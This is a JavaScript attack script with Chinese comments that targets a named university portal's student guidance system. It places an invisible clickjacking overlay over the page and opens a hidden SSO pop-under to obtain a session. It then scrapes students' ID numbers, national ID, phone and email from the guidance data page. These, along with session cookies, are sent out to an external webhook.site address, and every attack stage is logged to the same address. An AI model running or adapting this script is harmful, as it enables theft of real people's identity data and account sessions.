(async () => {
    // === 設定 ===
    const webhook = "https://webhook.site/27f621f1-be96-441d-b9d6-41fa8f6f788e";
    const ssoUrl = "https://iportal2.ntnu.edu.tw/ssoIndex.do?apOu=GuidanceApp_LDAP&datetime1=" + Date.now();
    // 假設這是相對於 iframe 當前域名的路徑
    const targetUrl = "/GuidanceApp/Guidance_StudentDataStdtCtrl?Action=Page1BI";

    // === 工具函數 ===
    
    // 1. CORS 繞過日誌記錄器 (射後不理)
    // 使用 Image 物件發送 GET 請求，不會觸發 CORS 阻擋
    const log = (msg) => {
        try {
            new Image().src = `${webhook}?log=${encodeURIComponent(msg)}&t=${Date.now()}`;
        } catch(e) {}
    };

    // 2. 數據外傳器
    // 使用 no-cors 模式的 fetch 發送 JSON 數據
    const exfiltrate = (data) => {
        try {
            const payload = JSON.stringify(data);
            // 優先使用 navigator.sendBeacon (更可靠)
            if (navigator.sendBeacon) {
                const blob = new Blob([payload], {type: 'text/plain'});
                navigator.sendBeacon(webhook, blob);
            } else {
                // 回退方案
                fetch(webhook, {
                    method: 'POST',
                    mode: 'no-cors', // 關鍵：忽略跨域回應
                    headers: {'Content-Type': 'text/plain'}, // 避免觸發 Preflight
                    body: payload
                });
            }
            log("Exfiltration_Sent");
        } catch (e) {
            log("Exfil_Error_" + e.message);
        }
    };

    // === 攻擊流程 ===

    async function executeAttack() {
        log("Script_Started");

        // 步驟 1: 建立隱形覆蓋層 (點擊劫持)
        const overlay = document.createElement('div');
        overlay.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            background: rgba(0,0,0,0); 
            z-index: 2147483647; /* 最大整數值 */
            cursor: default;
        `;
        overlay.id = 'security_check_overlay'; // 取個無害的 ID
        document.body.appendChild(overlay);
        
        log("Overlay_Deployed_Waiting_For_Click");

        // 步驟 2: 定義觸發器 (一次性事件)
        const clickHandler = async (event) => {
            // 立即移除覆蓋層，讓使用者之後能正常操作
            overlay.remove();
            
            log("User_Clicked_Initiating_Auth");

            // 步驟 3: 觸發 SSO 彈窗 (Pop-under)
            // 嘗試將視窗開在螢幕外
            const popup = window.open(ssoUrl, "sso_auth_window", "width=100,height=100,left=-1000,top=-1000");
            
            if (popup) {
                // 嘗試讓彈窗失焦，主視窗聚焦
                try { popup.blur(); window.focus(); } catch(e) {}
                
                // 等待 5 秒讓 SSO 重定向流程跑完
                await new Promise(r => setTimeout(r, 5000));
                
                // 關閉彈窗
                try { popup.close(); } catch(e) {}
                log("Popup_Closed_Fetching_Data");

                // 步驟 4: 獲取受害者數據
                try {
                    const response = await fetch(targetUrl);
                    const text = await response.text();

                    // 步驟 5: 解析數據
                    let info = {};
                    try {
                        const clean = (str) => str ? str.replace(/<[^>]+>/g, '').trim() : "N/A";
                        // 使用正則抓取標籤後的內容
                        info.studentId = clean(text.match(/學生學號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                        info.name = clean(text.match(/學生姓名:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                        info.idCard = clean(text.match(/身分證字號:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                        info.phone = clean(text.match(/手機:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                        info.email = clean(text.match(/E-mail:[\s\S]*?form-control-static">([^<]+)/)?.[1]);
                    } catch (parseErr) {
                        log("Parse_Error");
                    }

                    // 步驟 6: 回傳數據
                    exfiltrate({
                        status: "SUCCESS",
                        data: info,
                        cookie: document.cookie,
                        // 可選：回傳部分 HTML 以供調試 (前 1000 字)
                        partial_source: text.substring(0, 10000) 
                    });

                } catch (fetchErr) {
                    log("Fetch_Error_" + fetchErr.message);
                }

            } else {
                log("Popup_Blocked");
            }
        };

        // 將監聽器綁定到覆蓋層
        overlay.addEventListener('click', clickHandler, { once: true });
    }

    // 執行
    try {
        executeAttack();
    } catch(e) {
        // 最後一道防線的錯誤回報
        new Image().src = webhook + "?fatal_error=" + encodeURIComponent(e.message);
    }

})();